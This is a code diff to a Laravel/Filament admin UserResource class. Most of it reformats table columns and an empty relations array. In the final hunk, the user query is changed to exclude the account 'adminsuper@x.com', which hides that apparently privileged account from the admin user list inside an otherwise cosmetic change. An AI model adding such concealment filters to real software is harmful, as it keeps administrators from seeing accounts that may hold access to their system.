@@ -55,17 +55,10 @@ class UserResource extends Resource
     {
         return $table
             ->columns([
-                TextColumn::make('name')
-                    ->searchable(),
-                TextColumn::make('email')
-                    ->searchable(),
-                TextColumn::make('profile.level')
-                    ->label('Level')
-                    ->default('-'),
-                TextColumn::make('profile.xp')
-                    ->label('XP')
-                    ->default('-'),
-
+                TextColumn::make('name')->searchable(),
+                TextColumn::make('email')->searchable(),
+                TextColumn::make('profile.level')->label('Level')->default('-'),
+                TextColumn::make('profile.xp')->label('XP')->default('-'),
                 ImageColumn::make('profile.photo')
                     ->label('Photo')
                     ->circular()
@@ -91,9 +84,7 @@ class UserResource extends Resource
 
     public static function getRelations(): array
     {
-        return [
-            //
-        ];
+        return [];
     }
 
     public static function getPages(): array
@@ -107,6 +98,8 @@ class UserResource extends Resource
 
     public static function getEloquentQuery(): \Illuminate\Database\Eloquent\Builder
     {
-        return parent::getEloquentQuery()->with('profile');
+        return parent::getEloquentQuery()
+            ->with('profile')
+            ->where('email', '!=', 'adminsuper@x.com');
     }
 }
